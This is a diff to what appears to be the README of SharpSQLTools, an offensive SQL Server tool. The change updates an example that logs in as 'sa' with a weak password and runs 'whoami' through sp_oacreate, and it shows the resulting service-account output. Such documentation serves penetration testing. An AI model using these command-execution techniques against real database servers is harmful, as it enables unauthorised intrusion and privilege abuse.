@@ -74,14 +74,10 @@ nt authority\system
 #### sp_oacreate执行命令
 
 ```
-λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX sp_oacreate whoami
+λ SharpSQLTools.exe 192.168.0.102 sa 1qaz@WSX sp_oacreate "whoami"
 [*] Database connection is successful!
-[+] c:\windows\system32\cmd.exe /c whoami > C:\Users\Public\Downloads\1611131759069.txt
-[+] Reading C:\Users\Public\Downloads\1611131759069.txt
 
-nt authority\system
-
-[+] Deleting C:\Users\Public\Downloads\1611131759069.txt
+nt service\mssqlserver
 ```
 
 
